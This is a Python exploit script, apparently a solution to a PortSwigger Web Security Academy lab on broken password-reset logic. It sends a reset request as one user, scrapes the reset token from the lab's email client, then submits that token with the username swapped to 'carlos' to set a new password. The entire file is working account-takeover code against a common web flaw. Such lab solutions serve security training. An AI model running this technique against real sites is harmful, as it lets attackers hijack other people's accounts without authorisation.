#################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 26/8/2023
#
# Lab: Password reset broken logic
#
# Steps: 1. Send forgot-password request as wiener
#        2. Extract the token from the email client
#        3. Send change-password request as carlos
#
#################################################################

###########
# imports
###########
import requests
import re
from colorama import Fore

# change this url
url = "https://0a3500c404b04644825ea7d900000078.web-security-academy.net"
# change this url
email_client = "https://exploit-0af800610471462582dea6a50168007b.exploit-server.net/email"

try:  # try to make a forgot password request to wiener
    post_forgot_password = requests.post(
        f"{url}/forgot-password", data={"username": "wiener"})
    if post_forgot_password.status_code == 200:  # if the request succeeded
        print("1. Send forgot-password request as wiener.. ☑️")
        try:  # try to fetch your exploit server page to extract the token from
            get_token = requests.get(email_client)
            if get_token.status_code == 200:
                # search for token in the page
                temp_token = re.findall(
                    "temp-forgot-password-token=(.*)'", get_token.text)[0]
                if len(temp_token) != 0:  # when token is found
                    print("2. Extract the token from the email client.. ☑️")
                    new_password = "Hacked"  # change this to what you want
                    data = {
                        "temp-forgot-password-token": temp_token,
                        "username": "carlos",
                        "new-password-1": new_password,
                        "new-password-2": new_password
                    }
                    try:  # try to change carlos password
                        change_password = requests.post(
                            f"{url}/forgot-password", data, allow_redirects=False)
                        print("3. Send change-password request as carlos.. ☑️")
                        if change_password.status_code == 302:  # if you changed carlos password successfully
                            print(
                                Fore.GREEN + "Carlos password changed succussfully to: " + new_password)
                        else:
                            print(Fore.RED + "Change password request failed")
                    except:
                        print(
                            Fore.RED + "Change password request failed through exception")
                else:
                    print(Fore.RED + "No token found on the server through exception")
        except:
            print(Fore.RED + "Failed to get the exloit server through exception")
except:
    print(Fore.RED + "Failed to send forgot password request through exception")
